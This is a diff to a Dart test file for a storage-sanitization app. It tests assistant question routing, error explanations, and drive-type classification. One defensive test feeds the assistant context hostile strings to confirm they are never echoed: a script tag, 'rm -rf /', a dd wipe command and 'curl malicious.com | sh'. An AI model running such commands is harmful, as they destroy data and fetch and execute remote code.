@@ -76,7 +76,7 @@ void main() {
       expect(winExplain.nextStep, contains('User Account Control (UAC)'));
 
       final androidExplain = SanitizationErrorCode.permissionDenied.explain(platform: androidContext.platform);
-      expect(androidExplain.nextStep, contains('Device Administrator'));
+      expect(androidExplain.nextStep, contains('USB permission required. Allow USB access when Android asks.'));
 
       final linExplain = SanitizationErrorCode.permissionDenied.explain(platform: linContext.platform);
       expect(linExplain.nextStep, contains('Polkit'));
@@ -173,8 +173,28 @@ void main() {
       expect(unknownResponse.answer, contains('I can help with questions about storage sanitization methods'));
     });
 
-    test('every generated quick question returns a non-fallback answer (isFallback == false)', () {
+    test('every generated quick question returns its exact expected handlerId (isFallback == false)', () {
       final aiService = AiService();
+
+      final expectedHandlers = <String, String>{
+        'Why did verification fail?': 'verification_failure',
+        'What should I do after this error?': 'error_explanation',
+        'Why did the sanitization fail?': 'error_explanation',
+        'Explain this certificate': 'certificate_explanation',
+        'What does the cryptographic signature prove?': 'signature_explanation',
+        'What does security frozen mean?': 'security_frozen',
+        'What are HPA/DCO hidden sectors?': 'hpa_dco',
+        'Why is overwrite not recommended for SSDs?': 'ssd_overwrite',
+        'What is the Flash Translation Layer?': 'pales_research',
+        'How does overwrite work for HDDs?': 'hdd_overwrite',
+        'What sanitization method is recommended?': 'recommend_method',
+        'Why is this device high risk?': 'risk_explanation',
+        'Explain CLEAR vs PURGE': 'clear_vs_purge',
+        'Explain NIST SP 800-88 categories': 'nist_standards',
+        'What does cryptographic erase mean?': 'crypto_erase',
+        'What is physical destruction?': 'physical_destruction',
+        'What is PALES research?': 'pales_research',
+      };
 
       // Test across multiple state permutations
       final testContexts = [
@@ -200,7 +220,37 @@ void main() {
           reason: 'Generated question "$question" returned fallback response instead of a specialized handler.',
         );
         expect(response.answer.isNotEmpty, true);
+
+        final expectedHandler = question.startsWith('Explain this error:')
+            ? 'error_explanation'
+            : expectedHandlers[question];
+
+        expect(
+          response.handlerId,
+          expectedHandler,
+          reason: 'Question "$question" must route to exact handler "$expectedHandler", got "${response.handlerId}"',
+        );
       }
+    });
+
+    test('quick-question chips are built only from typed enums/codes, never from raw untrusted strings', () {
+      const hostileContext = AssistantContext(
+        deviceName: UntrustedText('<script>alert("pwned")</script> rm -rf / ; sudo dd if=/dev/zero'),
+        lastErrorMessage: UntrustedText('CRITICAL: rm -rf / ; curl malicious.com | sh'),
+        certificateId: UntrustedText('CERT-PAYLOAD-DROPPER-007'),
+        lastErrorCode: SanitizationErrorCode.permissionDenied,
+      );
+
+      final chips = hostileContext.quickQuestions;
+      for (final chip in chips) {
+        expect(chip.contains('<script>'), false);
+        expect(chip.contains('rm -rf'), false);
+        expect(chip.contains('curl'), false);
+        expect(chip.contains('malicious.com'), false);
+        expect(chip.contains('CERT-PAYLOAD'), false);
+        expect(chip.contains('pwned'), false);
+      }
+      expect(chips.contains('Explain this error: permissionDenied'), true);
     });
   });
 
@@ -451,6 +501,144 @@ void main() {
           }
         }
       }
+    });
+  });
+
+  group('MediaTechnology Tri-State (Cleanup Item 1)', () {
+    test('USB HDD: positive RPM classifies as rotational', () {
+      const usbHdd = DeviceProfile(
+        id: 'usb_hdd',
+        name: 'WD Elements 2TB',
+        serialNumber: 'WDC-USB-9988',
+        mediaType: MediaType.hdd,
+        busType: 'USB',
+        capacityBytes: 2000000000000,
+        rotationalRpm: 5400,
+        isRemovable: true,
+      );
+
+      expect(usbHdd.mediaTechnology, MediaTechnology.rotational);
+      expect(usbHdd.isRotational, true);
+      expect(usbHdd.isFlashMedia, false);
+    });
+
+    test('USB Flash: classifies as flash', () {
+      const usbFlash = DeviceProfile(
+        id: 'usb_flash',
+        name: 'SanDisk Ultra',
+        serialNumber: 'SD-USB-1234',
+        mediaType: MediaType.usbFlash,
+        busType: 'USB',
+        capacityBytes: 32000000000,
+        rotationalRpm: 0,
+        isRemovable: true,
+      );
+
+      expect(usbFlash.mediaTechnology, MediaTechnology.flash);
+      expect(usbFlash.isFlashMedia, true);
+      expect(usbFlash.isRotational, false);
+    });
+
+    test('Unknown-media USB bridge: classifies as unknown', () {
+      const usbBridge = DeviceProfile(
+        id: 'usb_bridge',
+        name: 'JMicron Generic Enclosure',
+        serialNumber: 'JM-001122',
+        mediaType: MediaType.unknown,
+        busType: 'USB',
+        capacityBytes: 500000000000,
+        rotationalRpm: null,
+        isRemovable: true,
+      );
+
+      expect(usbBridge.mediaTechnology, MediaTechnology.unknown);
+      expect(usbBridge.isFlashMedia, false);
+      expect(usbBridge.isRotational, false);
+    });
+
+    test('Conflicting signals: NVMe with positive RPM classifies as unknown', () {
+      const conflictingNvme = DeviceProfile(
+        id: 'nvme_conflicting',
+        name: 'Odd NVMe Reporting 7200 RPM',
+        serialNumber: 'NVME-ANOMALY',
+        mediaType: MediaType.nvmeSsd,
+        busType: 'PCIe NVMe',
+        capacityBytes: 1000000000000,
+        rotationalRpm: 7200,
+        isRemovable: false,
+      );
+
+      expect(conflictingNvme.mediaTechnology, MediaTechnology.unknown);
+      expect(conflictingNvme.isFlashMedia, false);
+      expect(conflictingNvme.isRotational, false);
+    });
+
+    test('Reported as HDD but RPM is explicitly 0 classifies as unknown (not rotational)', () {
+      const hddRpm0 = DeviceProfile(
+        id: 'hdd_zero_rpm',
+        name: 'Suspicious HDD reporting 0 RPM',
+        serialNumber: 'HDD-0RPM',
+        mediaType: MediaType.hdd,
+        busType: 'SATA',
+        capacityBytes: 500000000000,
+        rotationalRpm: 0,
+        isRemovable: false,
+      );
+
+      expect(hddRpm0.mediaTechnology, MediaTechnology.unknown);
+      expect(hddRpm0.isRotational, false);
+      expect(hddRpm0.isFlashMedia, false);
+    });
+  });
+
+  group('Internal eMMC Qualification (Cleanup Item 4)', () {
+    test('internal eMMC is non-removable, not typed SD, and not disabled by default', () {
+      const emmc = DeviceProfile(
+        id: 'mmcblk0',
+        name: 'SanDisk DF4064 eMMC 64GB',
+        serialNumber: 'EMMC64G-99A1',
+        mediaType: MediaType.emmc,
+        busType: 'eMMC 5.1',
+        capacityBytes: 64424509440,
+        rotationalRpm: 0,
+        isRemovable: false,
+        isSystemDisk: false,
+      );
+
+      expect(emmc.isRemovable, false, reason: 'Internal eMMC must be non-removable');
+      expect(emmc.driveType != DriveType.sd, true, reason: 'Internal eMMC must NOT be typed SD');
+      expect(emmc.driveType, isNot(DriveType.sd));
+      expect(emmc.simpleDisabledReason, isNull, reason: 'Internal eMMC must NOT be disabled by default');
+      expect(emmc.mediaTechnology, MediaTechnology.flash);
+    });
+
+    test('internal eMMC is disabled ONLY if it is the system drive or unsupported', () {
+      const emmcSys = DeviceProfile(
+        id: 'mmcblk0',
+        name: 'System Board eMMC',
+        serialNumber: 'EMMC-SYS-1',
+        mediaType: MediaType.emmc,
+        busType: 'eMMC',
+        capacityBytes: 64424509440,
+        rotationalRpm: 0,
+        isRemovable: false,
+        isSystemDisk: true,
+      );
+      expect(emmcSys.simpleDisabledReason, 'System drive – protected');
+
+      const emmcDisabled = DeviceProfile(
+        id: 'mmcblk0',
+        name: 'Faulty eMMC',
+        serialNumber: 'EMMC-FAULT',
+        mediaType: MediaType.emmc,
+        busType: 'eMMC',
+        capacityBytes: 64424509440,
+        rotationalRpm: 0,
+        isRemovable: false,
+        isSystemDisk: false,
+        disabledReason: 'Hardware write-protection active',
+      );
+      expect(emmcDisabled.simpleDisabledReason, 'Hardware write-protection active');
     });
   });
 }
